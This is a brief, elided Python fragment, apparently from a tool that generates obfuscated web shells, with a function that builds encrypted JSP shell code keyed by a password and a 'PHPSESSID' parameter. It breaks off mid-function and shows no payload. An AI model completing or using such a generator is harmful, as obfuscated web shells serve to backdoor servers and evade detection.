...
from shell.handler import list_handlers
from shell.generate import key, password
...
def obfuscated(file, cryptor, key, password, action='PHPSESSID'):
    if file.endswith('.jsp'):
        shellcode = generate_shell(file=file, key=key, action=action) # XXX
    else:
